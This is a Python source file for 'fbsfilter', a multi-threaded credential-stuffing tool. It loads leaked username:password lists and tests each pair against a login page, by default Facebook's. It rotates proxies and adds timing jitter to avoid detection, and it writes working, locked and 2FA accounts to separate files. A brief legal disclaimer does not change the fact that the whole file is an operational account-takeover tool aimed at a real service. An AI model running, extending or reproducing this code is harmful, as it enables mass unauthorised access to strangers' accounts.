#!/usr/bin/env python3
"""
fbsfilter – Credential Filter Tool
====================================
Load a list of leaked credentials (email/username:password), check which
accounts are still active, and write results to separate output files.

Supports:
  • Multi-threaded checking for high throughput
  • Optional proxy rotation (HTTP / HTTPS / SOCKS5)
  • Configurable target via config.ini or command-line flags
  • Live console statistics with progress bar
  • Checkpoint / resume support for large files

LEGAL NOTICE
------------
This tool is intended solely for security research, penetration testing, and
account recovery on systems you own or have explicit written permission to test.
Unauthorized credential stuffing or account access attempts are illegal in most
jurisdictions.  The authors assume no liability for misuse.

Usage:
  python fbsfilter.py -i leaks.txt [options]

For full help:
  python fbsfilter.py --help
"""

import argparse
import configparser
import json
import logging
import os
import queue
import sys
import threading
import time
from dataclasses import dataclass
from typing import Optional

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False

    class _NoColor:
        def __getattr__(self, _):
            return ""

    Fore = Style = _NoColor()

try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

from utils.file_handler import (
    CheckpointManager, CredentialReader, ResultWriter, SessionResultWriter,
    auto_detect_delimiter,
)
from utils.checker import CheckResult, CredentialChecker, Status, TargetConfig
from utils.proxy_manager import ProxyManager


# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------

def _setup_logging(log_file: str, verbose: bool) -> logging.Logger:
    level = logging.DEBUG if verbose else logging.INFO
    fmt = "%(asctime)s [%(levelname)s] %(message)s"
    handlers = [logging.FileHandler(log_file, encoding="utf-8")]
    if verbose:
        handlers.append(logging.StreamHandler(sys.stderr))
    logging.basicConfig(level=level, format=fmt, handlers=handlers)
    return logging.getLogger("fbsfilter")


# ---------------------------------------------------------------------------
# Statistics counter (thread-safe)
# ---------------------------------------------------------------------------

class Stats:
    def __init__(self):
        self._lock = threading.Lock()
        self.processed = 0
        self.working = 0
        self.invalid = 0
        self.locked = 0
        self.twofa = 0
        self.errors = 0

    def record(self, result: CheckResult) -> None:
        with self._lock:
            self.processed += 1
            if result.status == Status.WORKING:
                self.working += 1
            elif result.status == Status.INVALID:
                self.invalid += 1
            elif result.status == Status.LOCKED:
                self.locked += 1
            elif result.status == Status.TWOFA:
                self.twofa += 1
            else:
                self.errors += 1

    def summary(self) -> str:
        return (
            f"Processed: {self.processed} | "
            f"{Fore.GREEN}Working: {self.working}{Style.RESET_ALL} | "
            f"{Fore.RED}Invalid: {self.invalid}{Style.RESET_ALL} | "
            f"{Fore.YELLOW}Locked: {self.locked}{Style.RESET_ALL} | "
            f"{Fore.CYAN}2FA: {self.twofa}{Style.RESET_ALL} | "
            f"Errors: {self.errors}"
        )


# ---------------------------------------------------------------------------
# Worker thread
# ---------------------------------------------------------------------------

def _worker(
    task_queue: "queue.Queue[Optional[tuple]]",
    target: TargetConfig,
    proxy_manager: Optional[ProxyManager],
    writer: ResultWriter,
    stats: Stats,
    timeout: int,
    retries: int,
    delay: float,
    delay_jitter: float,
    logger: logging.Logger,
    progress_bar,
) -> None:
    while True:
        item = task_queue.get()
        if item is None:
            task_queue.task_done()
            break

        username, password = item
        proxies = proxy_manager.get() if proxy_manager else None

        checker = CredentialChecker(
            target=target,
            timeout=timeout,
            retries=retries,
            delay=delay,
            delay_jitter=delay_jitter,
            proxies=proxies,
        )

        result = checker.check(username, password)
        stats.record(result)

        # Mark bad proxy if we got a proxy error
        if result.status == Status.ERROR and proxies and proxy_manager:
            proxy_manager.mark_bad(proxies)

        # Write result
        category = result.status.value
        writer.write(category, username, password, result.detail)

        logger.debug(
            "[%s] %s:%s  url=%s  detail=%s",
            result.status.value.upper(),
            username,
            password,
            result.response_url,
            result.detail,
        )

        if progress_bar is not None:
            progress_bar.update(1)
            progress_bar.set_postfix_str(
                f"W:{stats.working} I:{stats.invalid} L:{stats.locked} 2FA:{stats.twofa} E:{stats.errors}",
                refresh=False,
            )

        task_queue.task_done()


# ---------------------------------------------------------------------------
# Configuration loading
# ---------------------------------------------------------------------------

def _load_config(config_path: str) -> configparser.ConfigParser:
    cfg = configparser.ConfigParser()
    cfg.read(config_path, encoding="utf-8")
    return cfg


def _build_target(cfg: configparser.ConfigParser, args: argparse.Namespace) -> TargetConfig:
    t = cfg["Target"] if "Target" in cfg else {}
    extra_raw = t.get("extra_fields", "{}")
    try:
        extra_fields = json.loads(extra_raw)
    except json.JSONDecodeError:
        extra_fields = {}

    success_status_raw = t.get("success_status", "").strip()
    success_status = int(success_status_raw) if success_status_raw.isdigit() else None

    return TargetConfig(
        url=getattr(args, "url", None) or t.get("url", "https://www.facebook.com/login.php"),
        username_field=t.get("username_field", "email"),
        password_field=t.get("password_field", "pass"),
        extra_fields=extra_fields,
        method=t.get("method", "POST").upper(),
        success_redirect_contains=t.get("success_redirect_contains", "facebook.com"),
        failure_keyword=t.get("failure_keyword", "incorrect password"),
        success_status=success_status,
    )


# ---------------------------------------------------------------------------
# CLI argument parsing
# ---------------------------------------------------------------------------

def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="fbsfilter",
        description="fbsfilter – Credential Filter Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "-i", "--input",
        required=True,
        metavar="FILE",
        help="Input file with credentials (username:password, one per line)",
    )
    parser.add_argument(
        "-c", "--config",
        default="config.ini",
        metavar="FILE",
        help="Path to config.ini (default: config.ini)",
    )
    parser.add_argument(
        "-p", "--proxies",
        metavar="FILE",
        help="Path to proxy list file (enables proxy mode)",
    )
    parser.add_argument(
        "-t", "--threads",
        type=int,
        default=None,
        metavar="N",
        help="Number of worker threads (default: from config)",
    )
    parser.add_argument(
        "-d", "--delimiter",
        default=None,
        metavar="CHAR",
        help="Credential delimiter (default: from config, usually ':')",
    )
    parser.add_argument(
        "--no-proxy",
        action="store_true",
        help="Force no-proxy mode even if config enables proxies",
    )
    parser.add_argument(
        "--url",
        default=None,
        metavar="URL",
        help="Override the login URL from config",
    )
    parser.add_argument(
        "--skip",
        type=int,
        default=None,
        metavar="N",
        help="Skip the first N credentials (override checkpoint)",
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose debug logging",
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------

BANNER = rf"""
{Fore.CYAN}
  __  _         __ _ _ _
 / _|| |__  ___/ _(_) | |_ ___ _ __
|  _ | '_ \/ __| |_| | | __/ _ \ '__|
| |_|| |_) \__ \  _| | | ||  __/ |
 \___||_.__/|___/_| |_|_|\__\___|_|

{Fore.YELLOW}  fbsfilter – Credential Filter Tool  v1.0
{Fore.RED}  For authorised testing only.{Style.RESET_ALL}
"""


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def main() -> None:
    args = _parse_args()

    cfg = _load_config(args.config)

    gen = cfg["General"] if "General" in cfg else {}
    out = cfg["Output"] if "Output" in cfg else {}
    prx = cfg["Proxy"] if "Proxy" in cfg else {}

    log_file = out.get("log_file", "fbsfilter.log")
    log = _setup_logging(log_file, args.verbose)

    print(BANNER)

    # -- Input file ----------------------------------------------------------
    if not os.path.isfile(args.input):
        print(f"{Fore.RED}[ERROR] Input file not found: {args.input}{Style.RESET_ALL}")
        sys.exit(1)

    delimiter = args.delimiter or gen.get("delimiter", "auto")
    reader = CredentialReader(args.input, delimiter=delimiter)
    print(f"{Fore.CYAN}[INPUT] Delimiter: '{reader.delimiter}' (auto-detected){Style.RESET_ALL}")

    # -- Output files --------------------------------------------------------
    use_session = out.get("use_session_folder", "false").lower() == "true"
    if use_session:
        session_base = out.get("session_base_dir", ".")
        writer: ResultWriter = SessionResultWriter(base_dir=session_base)
        session_dir = writer.session_dir  # type: ignore[attr-defined]
        print(f"{Fore.CYAN}[OUTPUT] Session folder: {session_dir}{Style.RESET_ALL}")
        working_display = os.path.join(session_dir, "working.txt")
    else:
        writer = ResultWriter(
            working_file=out.get("working_file", "working.txt"),
            invalid_file=out.get("invalid_file", "invalid.txt"),
            locked_file=out.get("locked_file", "locked.txt"),
            twofa_file=out.get("twofa_file", "2fa.txt"),
            error_file=out.get("error_file", "error.txt"),
            malformed_file=out.get("malformed_file", "malformed.txt"),
        )
        working_display = out.get("working_file", "working.txt")

    # -- Checkpoint / resume -------------------------------------------------
    checkpoint_every = int(gen.get("checkpoint_every", 500))
    checkpoint = CheckpointManager()
    skip = args.skip if args.skip is not None else checkpoint.load()
    if skip:
        print(f"{Fore.YELLOW}[INFO] Resuming from credential #{skip + 1}{Style.RESET_ALL}")

    # -- Target configuration ------------------------------------------------
    target = _build_target(cfg, args)
    print(f"{Fore.CYAN}[TARGET] {target.url}{Style.RESET_ALL}")

    # -- Proxy setup ---------------------------------------------------------
    use_proxy = False
    proxy_manager: Optional[ProxyManager] = None
    dead_proxies_file = prx.get("dead_proxies_file", "dead_proxies.txt") or None

    if not args.no_proxy:
        proxy_file = args.proxies or (prx.get("proxy_file") if prx.get("enabled", "false").lower() == "true" else None)
        if proxy_file:
            use_proxy = True
            proxy_manager = ProxyManager(
                proxy_file=proxy_file,
                rotate_every=int(prx.get("rotate_every", 1)),
                test_proxies=prx.get("test_proxies", "false").lower() == "true",
                test_url=prx.get("test_url", "https://www.facebook.com"),
                timeout=int(gen.get("timeout", 10)),
                dead_proxies_file=dead_proxies_file,
            )
            if proxy_manager.count == 0:
                print(f"{Fore.RED}[WARNING] No valid proxies found – running without proxy.{Style.RESET_ALL}")
                proxy_manager = None
                use_proxy = False
            else:
                print(f"{Fore.CYAN}[PROXY] {proxy_manager.count} proxies loaded{Style.RESET_ALL}")

    if not use_proxy:
        print(f"{Fore.YELLOW}[PROXY] Running WITHOUT proxies{Style.RESET_ALL}")

    # -- Thread pool parameters ----------------------------------------------
    thread_count = args.threads or int(gen.get("threads", 10))
    timeout = int(gen.get("timeout", 10))
    retries = int(gen.get("retries", 2))
    delay = float(gen.get("delay", 0.5))
    delay_jitter = float(gen.get("delay_jitter", 0.3))

    print(
        f"{Fore.CYAN}[CONFIG] threads={thread_count}  timeout={timeout}s  "
        f"retries={retries}  delay={delay}s  jitter={delay_jitter}s{Style.RESET_ALL}"
    )

    # -- Count total lines for progress bar ----------------------------------
    total = reader.count_lines()
    print(f"{Fore.CYAN}[INPUT] {total} credentials in {args.input}{Style.RESET_ALL}\n")

    # -- Set up task queue ---------------------------------------------------
    task_queue: queue.Queue = queue.Queue(maxsize=thread_count * 4)
    stats = Stats()
    start_time = time.time()

    progress_bar = None
    if HAS_TQDM:
        progress_bar = tqdm(
            total=max(0, total - skip),
            desc="Checking",
            unit="cred",
            colour="cyan",
            dynamic_ncols=True,
        )

    # -- Start workers -------------------------------------------------------
    workers = []
    for _ in range(thread_count):
        t = threading.Thread(
            target=_worker,
            args=(
                task_queue, target, proxy_manager, writer,
                stats, timeout, retries, delay, delay_jitter, log, progress_bar,
            ),
            daemon=True,
        )
        t.start()
        workers.append(t)

    # -- Feed credentials into queue -----------------------------------------
    malformed_count = 0
    try:
        idx = 0
        for username, password, raw_line in reader.stream_with_malformed():
            idx += 1
            if username is None:
                # Malformed line – log it and skip
                writer.write_malformed(raw_line)
                malformed_count += 1
                continue
            if idx <= skip:
                continue
            task_queue.put((username, password))

            # Checkpoint saving
            total_done = skip + (idx - skip)
            if checkpoint_every > 0 and total_done % checkpoint_every == 0:
                checkpoint.save(total_done)

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[INFO] Interrupted – draining queue…{Style.RESET_ALL}")
        checkpoint.save(stats.processed + skip)

    finally:
        # Send sentinel values to stop workers
        for _ in workers:
            task_queue.put(None)

    # -- Wait for all tasks to complete --------------------------------------
    task_queue.join()
    for t in workers:
        t.join()

    if progress_bar is not None:
        progress_bar.close()

    writer.close()
    checkpoint.clear()

    elapsed = time.time() - start_time
    speed = stats.processed / elapsed if elapsed > 0 else 0

    print(f"\n{Fore.GREEN}{'=' * 60}{Style.RESET_ALL}")
    print(f"  {stats.summary()}")
    if malformed_count:
        print(f"  {Fore.YELLOW}Malformed/skipped: {malformed_count}{Style.RESET_ALL}")
    print(f"  Elapsed: {elapsed:.1f}s   Speed: {speed:.1f} creds/s")
    print(f"{Fore.GREEN}{'=' * 60}{Style.RESET_ALL}\n")
    print(f"{Fore.GREEN}[DONE] Working accounts saved to: {working_display}{Style.RESET_ALL}")
    log.info("Run complete. %s", stats.summary())


if __name__ == "__main__":
    main()
